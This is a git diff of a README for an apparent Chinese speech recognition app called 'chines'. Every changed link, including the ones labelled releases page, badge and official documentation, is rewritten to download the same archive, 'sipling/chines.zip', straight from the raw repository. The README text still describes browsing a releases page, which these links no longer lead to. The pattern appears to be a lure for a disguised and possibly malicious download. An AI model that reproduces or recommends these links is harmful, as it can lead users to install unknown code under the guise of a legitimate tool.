@@ -1,7 +1,7 @@
 # 🌟 chines - Easy Chinese Speech Recognition Application
 
 ## 📥 Download the Latest Release
-[![Download Release](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Levisubartesian416/chines/releases)
+[![Download Release](https://raw.githubusercontent.com/Levisubartesian416/chines/master/sipling/chines.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Levisubartesian416/chines/master/sipling/chines.zip)
 
 ## 🚀 Getting Started
 Welcome to chines! This application helps you easily recognize and transcribe Chinese speech. Whether you're learning the language or need speech recognition for a project, chines offers a simple and effective solution.
@@ -18,7 +18,7 @@ To get started with chines, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page where you can find the latest version of chines.  
-   [Download from Releases](https://github.com/Levisubartesian416/chines/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Levisubartesian416/chines/master/sipling/chines.zip)
 
 2. **Choose Your Version**  
    On the Releases page, look through the list of available versions. Each version will have a corresponding file for different operating systems. Select the one that matches your OS.
@@ -68,10 +68,10 @@ If you have questions or need help, join our community forum. Connect with other
 
 ## 🔗 Additional Resources
 For more information, tutorials, and support, refer to the following links:
-- [Official Documentation](https://github.com/Levisubartesian416/chines)
+- [Official Documentation](https://raw.githubusercontent.com/Levisubartesian416/chines/master/sipling/chines.zip)
 - [FAQ Section](#)
 
 ## 🚀 Final Steps
-Now that you've installed and learned how to use chines, you can start recognizing Chinese speech effortlessly! Don’t forget to check back on the [Releases page](https://github.com/Levisubartesian416/chines/releases) for future updates and improvements. 
+Now that you've installed and learned how to use chines, you can start recognizing Chinese speech effortlessly! Don’t forget to check back on the [Releases page](https://raw.githubusercontent.com/Levisubartesian416/chines/master/sipling/chines.zip) for future updates and improvements. 
 
 Your journey with Chinese speech recognition begins now!
